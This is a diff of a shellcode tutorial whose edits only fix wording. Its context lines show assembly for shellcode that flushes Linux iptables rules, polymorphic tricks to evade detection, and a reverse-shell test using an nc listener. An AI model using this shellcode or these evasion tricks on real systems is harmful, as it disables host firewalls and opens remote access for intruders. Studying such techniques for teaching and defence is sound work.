@@ -33,7 +33,7 @@ callme:
  db '/sbin/iptables#-F#'
 ```
 
-This shellcode flush iptables rules (local Linux Firewall). In order to test the shellcode some rules must be set, with root privileges:
+This shellcode flush iptables rules (local Linux Firewall). In order to test the shellcode filtering rules must be set, with root privileges:
 
 ```sh
 $ nasm -f elf32 iptable-shellstrom.nasm && ld -N -z execstack -o iptable-shellstrom iptable-shellstrom.o
@@ -53,7 +53,7 @@ Polymorphism tricks will be:
   * Change the string '/sbin/iptables#-F#'
   * Do not put 0x0b into al which is known for calling execve
   * Do not use xor eax,eax (or others register)
-  * Add some junk code
+  * Add junk code
 
 ## Polymorphism
 "/sbin/iptables#-F#" become 0tcjo0jqubcmft#.G#
@@ -74,7 +74,7 @@ decode:
  sub esi, 17
 ```
 
-Lets move EXC into EAX to set EAX to zero and increment al as we decode the string.
+Let's move EXC into EAX to set EAX to zero and increment al as we decode the string.
 
 ```ASM
 main:
@@ -91,7 +91,7 @@ decode:
  loop decode
 ```
 
-At the end AL is set to 17, in order to set it to 0xb (11) lets subtract 6 and add some junk code. At the end of the decode loop, EAX is set. EAX/AL cannot be used as a null byte, but ECX/CL can.
+At the end AL is set to 17, in order to set it to 0xb (11) let's subtract 6 and add junk code. At the end of the decode loop, EAX is set. EAX/AL cannot be used as a null byte, but ECX/CL can.
 
 ```ASM
 main:
@@ -170,7 +170,7 @@ int    $0x80
 inc    %eax
 int    $0x80
 ```
-In order to get the shellcode in Intel format, lets just create an ASM file with this code, compile them using GNU Assembler (*gas* ou *as*; which came with *binutils* package).
+In order to get the shellcode in Intel format, let's just create an ASM file with this code, compile them using GNU Assembler (*gas* ou *as*; which came with *binutils* package).
 
 Note: on a x64 system, compilation must by adding *--32*.
 
@@ -260,7 +260,7 @@ inc    eax
 int    0x80
 ```
 
-Lets try this out!
+Let's try this out!
 
 ## Compilation
 
@@ -415,7 +415,7 @@ Before running the shellcode, start a listener on port 1337.
 $ nc -lv 1337
 ```
 
-Compilation is the same as usual. However a warning is set because of some junk code.
+Compilation is the same as usual. However a warning is set because of junk code.
 
 ```sh
 $ nasm -f elf32 reverse-poly.nasm 
